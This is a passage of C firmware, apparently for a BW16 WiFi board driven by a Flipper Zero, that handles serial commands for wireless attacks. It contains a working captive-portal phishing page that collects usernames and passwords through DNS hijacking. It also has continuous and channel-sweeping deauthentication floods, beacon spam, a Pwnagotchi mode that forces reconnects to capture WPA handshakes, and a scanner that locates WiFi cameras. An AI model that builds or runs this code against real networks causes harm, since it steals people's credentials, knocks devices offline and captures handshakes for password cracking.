    }
    else if(strncmp(c, "PORTAL,", 7)==0) {
        char tmp[PROTO_MAX_LEN];
        strncpy(tmp, c+7, PROTO_MAX_LEN-1); tmp[PROTO_MAX_LEN-1]='\0';
        char* ss = strtok(tmp,",");
        char* chs= strtok(NULL,",");
        if(!ss||!chs) return;
        start_portal(ss, "", (uint8_t)atoi(chs));   /* clone = open */
    }
    else if(strncmp(c, "AP,", 3)==0) {
        /* CMD,AP,<ssid>,<ch>,<password>  (password optional => open) */
        char tmp[PROTO_MAX_LEN];
        strncpy(tmp, c+3, PROTO_MAX_LEN-1); tmp[PROTO_MAX_LEN-1]='\0';
        char* ss = strtok(tmp,",");
        char* chs= strtok(NULL,",");
        char* pw = strtok(NULL,",\r\n");
        if(!ss||!chs) return;
        start_portal(ss, pw?pw:"", (uint8_t)atoi(chs));
    }
    else if(strncmp(c, "HTMLBEG", 7)==0) {
        g_html_len = 0; g_html_ready = false;
    }
    else if(strncmp(c, "HTMLD,", 6)==0) {
        b64_append(c+6);
    }
    else if(strncmp(c, "HTMLEND", 7)==0) {
        g_html_ready = (g_html_len > 0);
    }
    else if(strncmp(c, "BEACON,", 7)==0) {
        /* CMD,BEACON,RICK | RAND | STOP */
        const char* m = c+7;
        if(strncmp(m,"STOP",4)==0) {
            wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 0);
            g_mode = MODE_IDLE; led(0,1,0); g_last_scan=0; return;
        }
        if(strncmp(m,"RICK",4)==0) {
            g_beacon_count = 8;
            for(int i=0;i<8;i++){ strncpy(g_beacon_ssids[i],RICK_SSIDS[i],32);
                                  g_beacon_ssids[i][32]='\0'; }
        } else { /* RAND */
            static const char* CS="ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
            g_beacon_count = 10;
            for(int i=0;i<10;i++){
                for(int j=0;j<10;j++) g_beacon_ssids[i][j]=CS[random(32)];
                g_beacon_ssids[i][10]='\0';
            }
        }
        wifi_set_promisc(RTW_PROMISC_ENABLE_2, promisc_cb, 1);
        g_mode = MODE_BEACON;
    }
    else if(strncmp(c, "DCLR", 4)==0) {
        g_dall_count = 0;            /* clear the target list */
    }
    else if(strncmp(c, "DADD,", 5)==0) {
        /* CMD,DADD,<bssid>,<ch> — add a known target from the Flipper scan */
        char tmp[PROTO_MAX_LEN];
        strncpy(tmp, c+5, PROTO_MAX_LEN-1); tmp[PROTO_MAX_LEN-1]='\0';
        char* bs = strtok(tmp,",");
        char* chs= strtok(NULL,",\r\n");
        uint8_t mac[6];
        if(bs && chs && str_to_mac(bs, mac))
            dall_add(mac, (uint8_t)atoi(chs));
    }
    else if(strncmp(c, "DALL", 4)==0) {
        /* Deauth all targets (Flipper-provided list + self-learned beacons) */
        wifi_set_promisc(RTW_PROMISC_ENABLE_2, promisc_cb, 1);
        wifi_set_channel(g_dall_count>0 ? g_dall_ch[0] : 1);
        g_mode = MODE_DEAUTHALL;
    }
    else if(strncmp(c, "PWNSMART", 8)==0) {
        g_pwn_smart = !g_pwn_smart;   /* toggle passive/aggressive */
    }
    else if(strncmp(c, "PROBE", 5)==0) {
        /* sniff probe requests across all channels */
        wifi_set_promisc(RTW_PROMISC_ENABLE_2, promisc_cb, 1);
        wifi_set_channel(1);
        g_mode = MODE_PROBE;
    }
    else if(strncmp(c, "CAM", 3)==0) {
        /* hunt for WiFi cameras by vendor OUI */
        g_cam_seen_n = 0;
        wifi_set_promisc(RTW_PROMISC_ENABLE_2, promisc_cb, 1);
        wifi_set_channel(1);
        g_mode = MODE_CAMHUNT;
    }
    else if(strncmp(c, "DDET", 4)==0) {
        /* passive deauth-attack detector */
        wifi_set_promisc(RTW_PROMISC_ENABLE_2, promisc_cb, 1);
        wifi_set_channel(1);
        g_mode = MODE_DEAUTHDET;
    }
    else if(strncmp(c, "STA", 3)==0) {
        /* list stations (clients) talking to APs */
        g_cam_seen_n = 0;
        wifi_set_promisc(RTW_PROMISC_ENABLE_2, promisc_cb, 1);
        wifi_set_channel(1);
        g_mode = MODE_STATIONS;
    }
    else if(strncmp(c, "PWN", 3)==0) {
        /* Pwnagotchi auto mode: hop, deauth-to-reconnect, grab handshakes */
        g_dall_count = 0;
        g_pwn_smart = false;
        wifi_set_promisc(RTW_PROMISC_ENABLE_2, promisc_cb, 1);
        wifi_set_channel(1);
        g_mode = MODE_PWN;
    }
}

static void cmd_feed(uint8_t b) {
    if(b=='\n'||b=='\r') {
        if(cmd_pos>0) { cmd_buf[cmd_pos]='\0'; handle_cmd(cmd_buf); cmd_pos=0; }
        return;
    }
    if(cmd_pos < PROTO_MAX_LEN-1) cmd_buf[cmd_pos++]=(char)b;
}

/* ── Evil Portal ─────────────────────────────────────────────── */
static const char PORTAL_HTML[] =
"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nConnection: close\r\n\r\n"
"<!DOCTYPE html><html><head>"
"<meta name='viewport' content='width=device-width,initial-scale=1'>"
"<title>WiFi Login</title>"
"<style>*{box-sizing:border-box}body{margin:0;display:flex;height:100vh;"
"align-items:center;justify-content:center;background:#1a1a2e;font-family:sans-serif}"
".c{background:#16213e;padding:2rem;border-radius:12px;width:320px;"
"border:1px solid #0f3460;color:#eee}"
"h2{text-align:center;color:#e94560;margin:0 0 1.2rem}"
"input{width:100%;padding:.75rem;margin:.35rem 0;background:#0f3460;"
"border:1px solid #e94560;border-radius:8px;color:#fff;font-size:1rem}"
"button{width:100%;padding:.8rem;background:#e94560;color:#fff;border:none;"
"border-radius:8px;font-size:1rem;cursor:pointer;margin-top:.5rem}"
"p{text-align:center;font-size:.78rem;color:#888;margin-top:.6rem}</style></head>"
"<body><div class='c'><h2>&#x1F512; Network Login</h2>"
"<form method='GET' action='/l'>"
"<input type='text' name='u' placeholder='Username or Email' required>"
"<input type='password' name='p' placeholder='Password' required>"
"<button>Sign In</button></form>"
"<p>Your session has expired. Please login again.</p>"
"</div></body></html>";

static const char REDIRECT[] =
"HTTP/1.1 302 Found\r\nLocation: http://10.0.0.1/\r\nConnection: close\r\n\r\n";

static const char THANKS[] =
"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nConnection: close\r\n\r\n"
"<html><body style='font-family:sans-serif;text-align:center;margin-top:80px;"
"background:#1a1a2e;color:#eee'>"
"<h2>Connecting...</h2><p>Verifying credentials, please wait.</p></body></html>";

static void start_portal(const char* ssid, const char* pass, uint8_t ch) {
    /* Pure low-level soft-AP — bypass the flaky Arduino apbegin state
     * machine. Boot's WiFi.begin already ran LwIP_Init so xnetif exists. */
    wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 0); delay(100);
    dhcps_deinit();
    wifi_off();          delay(80);
    wifi_on(RTW_MODE_AP); delay(80);

    bool wpa = (pass && strlen(pass) >= 8);
    rtw_security_t sec = wpa ? RTW_SECURITY_WPA2_AES_PSK : RTW_SECURITY_OPEN;
    int plen = wpa ? (int)strlen(pass) : 0;
    int r = wifi_start_ap((char*)ssid, sec, (char*)(wpa?pass:""),
                          (int)strlen(ssid), plen, (uint8_t)(ch?ch:6));
    if(r < 0) { emit("O,9,ap_failed"); }
    delay(1500);   /* let the AP fully come up before DHCP */

    /* Force the AP IP to 192.168.1.1 (matches the DNS-hijack answer) and
     * start DHCP. LwIP_UseStaticIP can't be used here: it keys off the
     * Arduino lib's wifi_mode which our low-level wifi_on(AP) didn't set,
     * so it would wrongly apply the STA IP. Set the netif directly. */
    {
        struct ip_addr ipaddr, netmask, gw;
        IP4_ADDR(ip_2_ip4(&ipaddr),  192,168,1,1);
        IP4_ADDR(ip_2_ip4(&netmask), 255,255,255,0);
        IP4_ADDR(ip_2_ip4(&gw),      192,168,1,1);
        netif_set_addr(&xnetif[0], ip_2_ip4(&ipaddr),
                       ip_2_ip4(&netmask), ip_2_ip4(&gw));
    }
    dhcps_init(&xnetif[0]);
    delay(200);

    g_srv.begin();
    g_dns.begin(53);                 /* captive-portal DNS hijack */
    g_dns_up = true;
    g_client_announced = false;
    g_sta_assoc = false;
    /* notify us the instant a device associates (before DHCP/DNS) */
    wifi_reg_event_handler(WIFI_EVENT_STA_ASSOC, ap_assoc_cb, NULL);
    g_portal = true;
    g_mode   = MODE_PORTAL;
    led(1,0,1);  /* magenta = portal active */
    emit("O,0,up");
    emit(r < 0 ? "O,9,start_err" : "O,7,ap_ok");
}

/* Extract a form field value (key=value) from a request, URL-decoding.
 * Matches the key only at a ?,&,= or space boundary. */
static bool find_field(const char* req, const char* key, char* out, int outsz) {
    char pat[20]; int kl = snprintf(pat, sizeof(pat), "%s=", key);
    const char* p = req;
    while((p = strstr(p, pat))) {
        char prev = (p==req) ? '?' : p[-1];
        if(prev=='?'||prev=='&'||prev=='='||prev==' ') {
            p += kl; int i=0;
            while(*p && *p!='&' && *p!=' ' && *p!='\r' && *p!='\n' && i<outsz-1) {
                char c=*p++;
                if(c=='+') c=' ';
                else if(c=='%' && p[0] && p[1]) {
                    char h=p[0], l=p[1];
                    c=(char)(((h<='9'?h-'0':(h&0xDF)-'A'+10)<<4) |
                              (l<='9'?l-'0':(l&0xDF)-'A'+10));
                    p+=2;
                }
                out[i++]=c;
            }
            out[i]='\0';
            return i>0;
        }
        p += kl;
    }
    return false;
}

static void handle_portal() {
    if(!g_portal) return;
    WiFiClient cl = g_srv.available();
    if(!cl) return;
    char req[1024]; uint16_t rlen=0;
    uint32_t t0=millis();
    bool hdr_done=false;
    while(cl.connected() && (millis()-t0)<2000) {
        if(cl.available()) {
            char c=(char)cl.read();
            if(rlen<1023) req[rlen++]=c;
            if(!hdr_done && rlen>=4 && req[rlen-4]=='\r'&&req[rlen-3]=='\n'
                       && req[rlen-2]=='\r'&&req[rlen-1]=='\n') {
                hdr_done=true;
                /* keep reading briefly to catch a POST body, else stop */
                if(!cl.available()) { delay(40); if(!cl.available()) break; }
            }
        } else if(hdr_done) break;
    }
    req[rlen]='\0';
    emit("O,1,client");

    /* Credentials: accept any common field names from GET query or POST body */
    char user[80]="", pass[80]="";
    bool gotu = find_field(req,"email",user,80) || find_field(req,"username",user,80)
             || find_field(req,"user",user,80)  || find_field(req,"u",user,80)
             || find_field(req,"login",user,80);
    bool gotp = find_field(req,"password",pass,80) || find_field(req,"pass",pass,80)
             || find_field(req,"p",pass,80) || find_field(req,"pwd",pass,80);
    if(gotp || (gotu && strstr(req,"pass"))) {
        emit("O,2,%s:%s", user, pass);
        cl.print(THANKS);
        led(1,1,0);  /* yellow = creds received */
    } else {
        /* Serve the login page for EVERY other path so iOS/Android pop
         * the portal. Use custom HTML from the Flipper SD if streamed. */
        if(g_html_ready && g_html_len > 0) {
            cl.print("HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n"
                     "Connection: close\r\n\r\n");
            g_html[g_html_len]='\0';
            cl.print(g_html);
        } else {
            cl.print(PORTAL_HTML);
        }
    }
    cl.stop();
}

/* ── Setup ───────────────────────────────────────────────────── */
void setup() {
    pinMode(PIN_R,OUTPUT); pinMode(PIN_G,OUTPUT); pinMode(PIN_B,OUTPUT);
    led(0,0,0);

    /* Boot blink: R→G→B to identify physical LED colours */
    led(1,0,0); delay(200); led(0,0,0); delay(80);
    led(0,1,0); delay(200); led(0,0,0); delay(80);
    led(0,0,1); delay(200); led(0,0,0); delay(80);
    led(0,1,0);  /* steady green = ready */

    Serial.begin(115200);
    Serial1.begin(PROTO_BAUD);

    /* Initialise WiFi through the Arduino library so its internal
     * init_wlan / wifi_mode state is consistent — this is what lets a
     * later WiFi.apbegin() do a proper STA->AP switch (with DHCP) for
     * the Evil Portal. begin() turns the radio ON in STA and starts a
     * bogus join we immediately cancel; the radio stays up for scanning
     * and raw TX. (A raw wifi_on() left the lib thinking it was never
     * initialised, so the soft-AP never launched.) */
    static char init_ssid[] = "wifistudy-init";
    WiFi.begin(init_ssid);
    delay(150);
    WiFi.disconnect();
    delay(300);
    g_mode = MODE_IDLE;   /* STA mode: scanning works cleanly, no promisc */

    g_last_scan = millis() - SCAN_PERIOD_MS;  /* immediate scan on boot */
    g_last_hb   = millis();
    emit("R,BW16");
}

/* ── Loop ────────────────────────────────────────────────────── */
void loop() {
    uint32_t now = millis();

    /* Read commands from Flipper (either UART) */
    while(Serial1.available()) cmd_feed((uint8_t)Serial1.read());
    while(Serial.available())  cmd_feed((uint8_t)Serial.read());

    /* Heartbeat */
    if(now - g_last_hb >= HEARTBEAT_MS) { emit("R,BW16"); g_last_hb=now; }

    /* Portal client service */
    if(g_mode == MODE_PORTAL) {
        if(g_sta_assoc) { g_sta_assoc = false; emit("O,1,client"); }
        handle_dns(); handle_portal(); delay(2); return;
    }

    /* Capture: periodic deauth to force reconnect */
    if(g_mode == MODE_CAPTURE) {
        if(now - g_cap_last_deauth >= CAPTURE_DEAUTH_INTERVAL) {
            uint8_t frame[26];
            static const uint8_t bc[6]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
            build_deauth(frame, g_cap_bssid, bc, 7);
            wext_send_mgnt("wlan0", (char*)frame, 26, 0);
            g_cap_last_deauth = now;
        }
        if(g_cap_stage >= 4) {
            wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 0);
            g_mode = MODE_IDLE;
            led(0,1,0);
            g_last_scan = 0;
        }
        delay(5); return;
    }

    /* Beacon flood: spam the SSID list across channels 1/6/11 */
    if(g_mode == MODE_BEACON) {
        static int bch_i = 0;
        static const uint8_t bchs[3] = {1,6,11};
        uint8_t f[160];
        wifi_set_channel(bchs[bch_i]);
        for(int i=0;i<g_beacon_count;i++) {
            int n = build_beacon(f, g_beacon_ssids[i], bchs[bch_i], (uint8_t)i);
            wext_send_mgnt("wlan0", (char*)f, n, 0);
        }
        bch_i = (bch_i+1) % 3;
        led(0, (now/80)&1, (now/80)&1);   /* cyan flicker */
        delay(8);
        return;
    }

    /* Sustained deauth: blast frames continuously until CMD,STOP */
    if(g_mode == MODE_DEAUTH) {
        static uint32_t last_report = 0;
        deauth_burst(g_deauth_bssid, 32);   /* 64 frames per pass */
        led((now/60)&1, 0, 0);              /* flicker red = attacking */
        if(now - last_report >= 700) {       /* report frame count */
            char bs[18]; mac_to_str(g_deauth_bssid, bs);
            emit("W,%s,0", bs);             /* keeps Flipper status alive */
            last_report = now;
        }
        delay(2);
        return;
    }

    /* Deauth-All: sweep channels 1-13, dwell ~300 ms each, and during the
     * dwell HAMMER every known target on that channel continuously (the
     * promisc callback also keeps self-learning new APs from beacons). */
    if(g_mode == MODE_DEAUTHALL) {
        static uint8_t ch = 1; static uint32_t hop = 0;
        if(now - hop > 300) {
            ch = (ch % 13) + 1;
            g_cur_ch = ch; wifi_set_channel(ch);
            hop = now;
        }
        for(int i=0; i<g_dall_count; i++)
            if(g_dall_ch[i] == ch) deauth_burst(g_dall_bssid[i], 6);
        led((now/60)&1, 0, 0);                /* red flicker = attacking */
        delay(1);
        return;
    }

    /* Pwnagotchi: auto hop, deauth-to-reconnect, sniff handshakes */
    if(g_mode == MODE_PWN) {
        static uint8_t ch = 1; static uint32_t hop = 0;
        if(now - hop > 2500) {                /* longer dwell to catch EAPOL */
            ch = (ch % 13) + 1;
            g_cur_ch = ch; wifi_set_channel(ch);
            hop = now;
        }
        /* aggressive: nudge reconnects with gentle deauth. smart: pure
         * passive listen (no TX) — stealthy, only natural handshakes. */
        if(!g_pwn_smart) {
            for(int i=0; i<g_dall_count; i++)
                if(g_dall_ch[i] == ch) deauth_burst(g_dall_bssid[i], 2);
            led(0, 0, (now/120)&1);           /* blue pulse = hunting */
        } else {
            led(0, (now/400)&1, 0);           /* slow green = passive */
        }
        delay(5);
        return;
    }

    /* Deauth detector / station list: hop channels, work done in promisc cb */
    if(g_mode == MODE_DEAUTHDET || g_mode == MODE_STATIONS) {
        static uint8_t ch = 1; static uint32_t hop = 0;
        if(now - hop > 400) { ch = (ch % 13) + 1; g_cur_ch = ch;
                              wifi_set_channel(ch); hop = now; }
        led(0, 0, (now/250)&1);             /* blue blink = listening */
        delay(5);
        return;
    }

    /* Camera hunter: hop channels and let the promisc cb flag camera MACs */
    if(g_mode == MODE_CAMHUNT) {
        static uint8_t ch = 1; static uint32_t hop = 0;
        if(now - hop > 400) { ch = (ch % 13) + 1; g_cur_ch = ch;
                              wifi_set_channel(ch); hop = now; }
        led((now/150)&1, 0, (now/150)&1);   /* magenta = scanning for cams */
        delay(5);
        return;
    }

    /* Probe sniffer: hop channels so we hear probes everywhere */
    if(g_mode == MODE_PROBE) {
        static uint8_t ch = 1; static uint32_t hop = 0;
        if(now - hop > 350) { ch = (ch % 13) + 1; g_cur_ch = ch;
                              wifi_set_channel(ch); hop = now; }
        led(0, (now/200)&1, (now/200)&1);   /* cyan = listening */
        delay(5);
        return;
    }

    /* Protocol monitor: promisc callback does the work passively */
    if(g_mode == MODE_MONITOR) { delay(5); return; }

    /* MODE_IDLE: clean STA scan (no promisc fighting the scanner) */
    if(now - g_last_scan >= SCAN_PERIOD_MS) {
        led(1,1,0);                /* yellow = scanning */
        g_scan_done = false;
        wifi_scan_networks(scan_cb, NULL);
        uint32_t t0=millis();
        /* abort the scan early if a command arrives, so the portal/etc.
         * launch promptly instead of waiting out the whole scan */
        while(!g_scan_done && (millis()-t0)<SCAN_TIMEOUT_MS) {
            if(Serial1.available() || Serial.available()) break;
            delay(50);
        }
        led(0,1,0);                /* green = idle */
        g_last_scan = millis();
    }

    delay(5);
}
